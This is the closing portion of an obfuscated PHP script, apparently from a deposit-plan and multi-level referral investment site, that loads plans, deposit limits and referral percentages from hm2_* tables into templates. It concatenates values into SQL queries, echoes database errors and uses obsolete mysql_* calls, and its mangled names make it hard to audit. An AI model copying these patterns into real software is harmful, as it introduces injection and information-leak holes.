                                                                                            $elnlcnCveg = array ('d' => 'days', 'w' => 'weeks', 'b-w' => '2 weeks', 'm' => 'months', '2m' => '2 months', '3m' => '3 months', '6m' => '6 months', 'h' => 'hours', 'y' => 'years', 'end' => $elnlcsyENS['elnlciEuo']);
                                                                                            $elnlcCgqPK[$elnlcsyENS['elnlcNBsGo']] = $elnlcnCveg[$elnlcCgqPK[$elnlcsyENS['elnlcdryi']]];
                                                                                            $elnlcCgqPK[$elnlcsyENS['elnlcdryi']] = $elnlcweII[$elnlcCgqPK[$elnlcsyENS['elnlcdryi']]];
                                                                                            array_push ($elnlczhuc, $elnlcCgqPK);
                                                                                          }

                                                                                          $elnlcfhFg->assign ('index_plans', $elnlczhuc);
                                                                                          $elnlcfhFg->assign ('min_deposit', $elnlcGokT);
                                                                                          $elnlcfhFg->assign ('max_deposit', $elnlcxdwm);
                                                                                          $q = 'select max(percent) as percent from hm2_referal';
                                                                                          $elnlchGkPU = mysql_query ($q);
                                                                                          while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                                                                                          {
                                                                                            $elnlcfhFg->assign ('percent', $elnlcCgqPK[$elnlcsyENS['elnlcOhvjC']]);
                                                                                          }

                                                                                          $elnlcqjGg = array ();
                                                                                          $q = 'select * from hm2_referal order by from_value';
                                                                                          $elnlchGkPU = mysql_query ($q);
                                                                                          while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                                                                                          {
                                                                                            array_push ($elnlcqjGg, $elnlcCgqPK);
                                                                                          }

                                                                                          $elnlcfhFg->assign ('ref_plans', $elnlcqjGg);
                                                                                          $elnlcPbyEv = array ();
                                                                                          for ($l = $elnlcsyENS['elnlcbpKgI']; $l < 11; ++$l)
                                                                                          {
                                                                                            if ((0 < $elnlcSuVc['ref' . $l . '_cms'] AND $elnlcSuVc['ref' . $l . '_cms'] < 100))
                                                                                            {
                                                                                              array_push ($elnlcPbyEv, array ('level' => $l, 'percent' => $elnlcSuVc['ref' . $l . '_cms']));
                                                                                              continue;
                                                                                            }
                                                                                          }

                                                                                          $elnlcfhFg->assign ('ref_levels', $elnlcPbyEv);
                                                                                          $elnlcfhFg->display ($elnlcsyENS['elnlcLowFD']);
                                                                                        }
                                                                                      }
                                                                                      else
                                                                                      {
                                                                                        if ($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlclumcJ'])
                                                                                        {
                                                                                          $elnlcfhFg->assign ('frm', $elnlcWodOE);
                                                                                          $elnlcBFBSo = array ();
                                                                                          if (0 < $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']])
                                                                                          {
                                                                                            $q = 'select type_id from hm2_deposits where user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
                                                                                            ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                                                                                            while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                                                                                            {
                                                                                              array_push ($elnlcBFBSo, $elnlcCgqPK[$elnlcsyENS['elnlcPfzD']]);
                                                                                            }
                                                                                          }

                                                                                          $q = 'select * from hm2_types where status = \'on\' order by ordering';
                                                                                          ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                                                                                          $elnlcGokT = $elnlcsyENS['elnlcmNpWL'];
                                                                                          $elnlcxdwm = $elnlcsyENS['elnlcmjUx'];
                                                                                          $elnlczhuc = array ();
                                                                                          while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                                                                                          {
                                                                                            if (0 < $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']])
                                                                                            {
                                                                                              if (0 < $elnlcCgqPK[$elnlcsyENS['elnlcbViuH']])
                                                                                              {
                                                                                                if (!in_array ($elnlcCgqPK[$elnlcsyENS['elnlcbViuH']], $elnlcBFBSo))
                                                                                                {
                                                                                                  continue;
                                                                                                }
                                                                                              }
                                                                                            }

                                                                                            $q = 'select * from hm2_plans where parent = ' . $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']] . ' order by id';
                                                                                            if (!($elnlcjSNE = mysql_query ($q)))
                                                                                            {
                                                                                              exit (mysql_error ());
                                                                                              (bool)true;
                                                                                            }

                                                                                            $elnlcCgqPK[$elnlcsyENS['elnlcKBthk']] = array ();
                                                                                            while ($elnlcUpbus = mysql_fetch_array ($elnlcjSNE))
                                                                                            {
                                                                                              $elnlcUpbus[$elnlcsyENS['elnlcOBsC']] = '';
                                                                                              if ($elnlcUpbus[$elnlcsyENS['elnlcwFTQ']] < $elnlcGokT)
                                                                                              {
                                                                                                $elnlcGokT = $elnlcUpbus[$elnlcsyENS['elnlcwFTQ']];
                                                                                              }

                                                                                              if (($elnlcxdwm < $elnlcUpbus[$elnlcsyENS['elnlcMFyGk']] OR $elnlcUpbus[$elnlcsyENS['elnlcMFyGk']] == 0))
                                                                                              {
                                                                                                $elnlcxdwm = $elnlcUpbus[$elnlcsyENS['elnlcMFyGk']];
                                                                                              }

                                                                                              if ($elnlcUpbus[$elnlcsyENS['elnlcMFyGk']] == 0)
                                                                                              {
                                                                                                $elnlcUpbus[$elnlcsyENS['elnlcOBsC']] = $elnlcSuVc[currency_sign] . number_format ($elnlcUpbus[$elnlcsyENS['elnlcwFTQ']]) . ' and more';
                                                                                              }
                                                                                              else
                                                                                              {
                                                                                                $elnlcUpbus[$elnlcsyENS['elnlcOBsC']] = $elnlcSuVc[currency_sign] . number_format ($elnlcUpbus[$elnlcsyENS['elnlcwFTQ']]) . ' - ' . $elnlcSuVc[currency_sign] . number_format ($elnlcUpbus[$elnlcsyENS['elnlcMFyGk']]);
                                                                                              }

                                                                                              array_push ($elnlcCgqPK[$elnlcsyENS['elnlcKBthk']], $elnlcUpbus);
                                                                                            }

                                                                                            $elnlcweII = array ('d' => 'Daily', 'w' => 'Weekly', 'b-w' => 'Bi Weekly', 'm' => 'Monthly', '2m' => '2 Monthly', '3m' => '3 Monthly', '6m' => '6 Monthly', 'h' => 'Hourly', 'y' => $elnlcsyENS['elnlcRzpur']);
                                                                                            $elnlcnCveg = array ('d' => 'days', 'w' => 'weeks', 'b-w' => '2 weeks', 'm' => 'months', '2m' => '2 months', '3m' => '3 months', '6m' => '6 months', 'h' => 'hours', 'y' => 'years', 'end' => $elnlcsyENS['elnlciEuo']);
                                                                                            $elnlcCgqPK[$elnlcsyENS['elnlcNBsGo']] = $elnlcnCveg[$elnlcCgqPK[$elnlcsyENS['elnlcdryi']]];
                                                                                            $elnlcCgqPK[$elnlcsyENS['elnlcdryi']] = $elnlcweII[$elnlcCgqPK[$elnlcsyENS['elnlcdryi']]];
                                                                                            array_push ($elnlczhuc, $elnlcCgqPK);
                                                                                          }

                                                                                          $elnlcfhFg->assign ('index_plans', $elnlczhuc);
                                                                                          $elnlcfhFg->assign ('min_deposit', $elnlcGokT);
                                                                                          $elnlcfhFg->assign ('max_deposit', $elnlcxdwm);
                                                                                          $q = 'select max(percent) as percent from hm2_referal';
                                                                                          $elnlchGkPU = mysql_query ($q);
                                                                                          while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                                                                                          {
                                                                                            $elnlcfhFg->assign ('percent', $elnlcCgqPK[$elnlcsyENS['elnlcOhvjC']]);
                                                                                          }

                                                                                          $elnlcqjGg = array ();
                                                                                          $q = 'select * from hm2_referal order by from_value';
                                                                                          $elnlchGkPU = mysql_query ($q);
                                                                                          while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                                                                                          {
                                                                                            array_push ($elnlcqjGg, $elnlcCgqPK);
                                                                                          }

                                                                                          $elnlcfhFg->assign ('ref_plans', $elnlcqjGg);
                                                                                          $elnlcPbyEv = array ();
                                                                                          for ($l = $elnlcsyENS['elnlcbpKgI']; $l < 11; ++$l)
                                                                                          {
                                                                                            if ((0 < $elnlcSuVc['ref' . $l . '_cms'] AND $elnlcSuVc['ref' . $l . '_cms'] < 100))
                                                                                            {
                                                                                              array_push ($elnlcPbyEv, array ('level' => $l, 'percent' => $elnlcSuVc['ref' . $l . '_cms']));
                                                                                              continue;
                                                                                            }
                                                                                          }

                                                                                          $elnlcfhFg->assign ('ref_levels', $elnlcPbyEv);
                                                                                          $elnlcfhFg->display ($elnlcsyENS['elnlcHhjk']);
                                                                                        }
                                                                                        else
                                                                                        {
                                                                                          $elnlcfhFg->assign ('frm', $elnlcWodOE);
                                                                                          $elnlcBFBSo = array ();
                                                                                          if (0 < $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']])
                                                                                          {
                                                                                            $q = 'select type_id from hm2_deposits where user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
                                                                                            ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                                                                                            while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                                                                                            {
                                                                                              array_push ($elnlcBFBSo, $elnlcCgqPK[$elnlcsyENS['elnlcPfzD']]);
                                                                                            }
                                                                                          }

                                                                                          $q = 'select * from hm2_types where status = \'on\' order by ordering';
                                                                                          ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                                                                                          $elnlcGokT = $elnlcsyENS['elnlcmNpWL'];
                                                                                          $elnlcxdwm = $elnlcsyENS['elnlcmjUx'];
                                                                                          $elnlczhuc = array ();
                                                                                          while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                                                                                          {
                                                                                            if (0 < $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']])
                                                                                            {
                                                                                              if (0 < $elnlcCgqPK[$elnlcsyENS['elnlcbViuH']])
                                                                                              {
                                                                                                if (!in_array ($elnlcCgqPK[$elnlcsyENS['elnlcbViuH']], $elnlcBFBSo))
                                                                                                {
                                                                                                  continue;
                                                                                                }
                                                                                              }
                                                                                            }

                                                                                            $q = 'select * from hm2_plans where parent = ' . $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']] . ' order by id';
                                                                                            if (!($elnlcjSNE = mysql_query ($q)))
                                                                                            {
                                                                                              exit (mysql_error ());
                                                                                              (bool)true;
                                                                                            }

                                                                                            $elnlcCgqPK[$elnlcsyENS['elnlcKBthk']] = array ();
                                                                                            while ($elnlcUpbus = mysql_fetch_array ($elnlcjSNE))
                                                                                            {
                                                                                              $elnlcUpbus[$elnlcsyENS['elnlcOBsC']] = '';
                                                                                              if ($elnlcUpbus[$elnlcsyENS['elnlcwFTQ']] < $elnlcGokT)
                                                                                              {
                                                                                                $elnlcGokT = $elnlcUpbus[$elnlcsyENS['elnlcwFTQ']];
                                                                                              }

                                                                                              if (($elnlcxdwm < $elnlcUpbus[$elnlcsyENS['elnlcMFyGk']] OR $elnlcUpbus[$elnlcsyENS['elnlcMFyGk']] == 0))
                                                                                              {
                                                                                                $elnlcxdwm = $elnlcUpbus[$elnlcsyENS['elnlcMFyGk']];
                                                                                              }

                                                                                              if ($elnlcUpbus[$elnlcsyENS['elnlcMFyGk']] == 0)
                                                                                              {
                                                                                                $elnlcUpbus[$elnlcsyENS['elnlcOBsC']] = $elnlcSuVc[currency_sign] . number_format ($elnlcUpbus[$elnlcsyENS['elnlcwFTQ']]) . ' and more';
                                                                                              }
                                                                                              else
                                                                                              {
                                                                                                $elnlcUpbus[$elnlcsyENS['elnlcOBsC']] = $elnlcSuVc[currency_sign] . number_format ($elnlcUpbus[$elnlcsyENS['elnlcwFTQ']]) . ' - ' . $elnlcSuVc[currency_sign] . number_format ($elnlcUpbus[$elnlcsyENS['elnlcMFyGk']]);
                                                                                              }

                                                                                              array_push ($elnlcCgqPK[$elnlcsyENS['elnlcKBthk']], $elnlcUpbus);
                                                                                            }

                                                                                            $elnlcweII = array ('d' => 'Daily', 'w' => 'Weekly', 'b-w' => 'Bi Weekly', 'm' => 'Monthly', '2m' => '2 Monthly', '3m' => '3 Monthly', '6m' => '6 Monthly', 'h' => 'Hourly', 'y' => $elnlcsyENS['elnlcRzpur']);
                                                                                            $elnlcnCveg = array ('d' => 'days', 'w' => 'weeks', 'b-w' => '2 weeks', 'm' => 'months', '2m' => '2 months', '3m' => '3 months', '6m' => '6 months', 'h' => 'hours', 'y' => 'years', 'end' => $elnlcsyENS['elnlciEuo']);
                                                                                            $elnlcCgqPK[$elnlcsyENS['elnlcNBsGo']] = $elnlcnCveg[$elnlcCgqPK[$elnlcsyENS['elnlcdryi']]];
                                                                                            $elnlcCgqPK[$elnlcsyENS['elnlcdryi']] = $elnlcweII[$elnlcCgqPK[$elnlcsyENS['elnlcdryi']]];
                                                                                            array_push ($elnlczhuc, $elnlcCgqPK);
                                                                                          }

                                                                                          $elnlcfhFg->assign ('index_plans', $elnlczhuc);
                                                                                          $elnlcfhFg->assign ('min_deposit', $elnlcGokT);
                                                                                          $elnlcfhFg->assign ('max_deposit', $elnlcxdwm);
                                                                                          $q = 'select max(percent) as percent from hm2_referal';
                                                                                          $elnlchGkPU = mysql_query ($q);
                                                                                          while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                                                                                          {
                                                                                            $elnlcfhFg->assign ('percent', $elnlcCgqPK[$elnlcsyENS['elnlcOhvjC']]);
                                                                                          }

                                                                                          $elnlcqjGg = array ();
                                                                                          $q = 'select * from hm2_referal order by from_value';
                                                                                          $elnlchGkPU = mysql_query ($q);
                                                                                          while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                                                                                          {
                                                                                            array_push ($elnlcqjGg, $elnlcCgqPK);
                                                                                          }

                                                                                          $elnlcfhFg->assign ('ref_plans', $elnlcqjGg);
                                                                                          $elnlcPbyEv = array ();
                                                                                          for ($l = $elnlcsyENS['elnlcbpKgI']; $l < 11; ++$l)
                                                                                          {
                                                                                            if ((0 < $elnlcSuVc['ref' . $l . '_cms'] AND $elnlcSuVc['ref' . $l . '_cms'] < 100))
                                                                                            {
                                                                                              array_push ($elnlcPbyEv, array ('level' => $l, 'percent' => $elnlcSuVc['ref' . $l . '_cms']));
                                                                                              continue;
                                                                                            }
                                                                                          }

                                                                                          $elnlcfhFg->assign ('ref_levels', $elnlcPbyEv);
                                                                                          $elnlcfhFg->display ($elnlcsyENS['elnlcLowFD']);
                                                                                        }
                                                                                      }
                                                                                    }
                                                                                  }
                                                                                }
                                                                              }
                                                                            }
                                                                          }
                                                                        }
                                                                      }
                                                                    }
                                                                  }
                                                                }
                                                              }
                                                            }
                                                          }
                                                        }
                                                      }
                                                    }
                                                  }
                                                }
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }

  elnlcnooln ($elnlcUazB);
  exit ();
?>